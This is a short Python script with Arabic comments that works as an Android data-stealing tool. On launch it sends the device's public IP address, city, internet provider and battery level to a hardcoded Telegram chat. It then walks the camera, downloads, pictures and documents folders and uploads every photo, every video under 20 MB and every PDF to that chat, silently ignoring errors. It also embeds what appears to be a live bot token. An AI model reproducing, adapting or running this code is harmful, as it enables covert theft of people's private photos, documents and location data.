import os
import telebot
import time
import psutil
import requests
from threading import Thread

# --- بياناتك الأساسية ---
API_TOKEN = "8449493423:AAEcks7g40QbiHXB9V-cv29A2ZZE5vPIDTg"
bot = telebot.TeleBot(API_TOKEN)
MY_CHAT_ID = "8559960166"

# المسارات التي سيتم فحصها
paths_to_check = [
    "/storage/emulated/0/DCIM/Camera/",
    "/storage/emulated/0/Download/",
    "/storage/emulated/0/Pictures/",
    "/storage/emulated/0/Documents/"
]

def get_device_info():
    try:
        # جلب الـ IP والمعلومات الجغرافية
        response = requests.get('https://ipapi.co/json/', timeout=10)
        data = response.json()
        
        ip = data.get('ip')
        city = data.get('city')
        isp = data.get('org') # شركة الإنترنت (مثل زين أو آسيا سيل)
        
        # معلومات البطارية
        battery = psutil.sensors_battery()
        percent = battery.percent
        
        info_msg = (
            f"🚀 **تم تشغيل الأداة بنجاح**\n\n"
            f"🌐 **IP Address:** `{ip}`\n"
            f"🏢 **شركة الإنترنت:** {isp}\n"
            f"📍 **الموقع:** {city}\n"
            f"🔋 **البطارية:** {percent}%\n"
            f"🛠️ **الحالة:** فحص الملفات جارٍ..."
        )
        return info_msg
    except:
        return "⚠️ تم التشغيل، ولكن تعذر جلب معلومات الشبكة (تحقق من الـ VPN)."

def send_media(file_path):
    try:
        ext = file_path.lower()
        # إرسال الصور
        if ext.endswith((".jpg", ".png", ".jpeg")):
            with open(file_path, "rb") as f:
                bot.send_photo(chat_id=MY_CHAT_ID, photo=f)
        # إرسال الفيديوهات (أقل من 20 ميجا لضمان السرعة)
        elif ext.endswith((".mp4", ".mkv")):
            if os.path.getsize(file_path) < 20 * 1024 * 1024:
                with open(file_path, "rb") as f:
                    bot.send_video(chat_id=MY_CHAT_ID, video=f)
        # إرسال الملفات
        elif ext.endswith(".pdf"):
            with open(file_path, "rb") as f:
                bot.send_document(chat_id=MY_CHAT_ID, document=f)
        
        time.sleep(1.5) # فاصل زمني لتجنب حظر التلجرام
    except:
        pass

def start_scanning():
    # 1. إرسال معلومات الجهاز (IP والبطارية) أولاً
    bot.send_message(MY_CHAT_ID, get_device_info(), parse_mode="Markdown")
    
    # 2. بدء سحب الملفات
    for path in paths_to_check:
        if os.path.exists(path):
            for root, dirs, files in os.walk(path):
                for file in files:
                    file_path = os.path.join(root, file)
                    t = Thread(target=send_media, args=(file_path,))
                    t.start()
                    t.join() # لضمان إرسال ملف تلو الآخر وعدم تعليق التطبيق

if __name__ == "__main__":
    start_scanning()
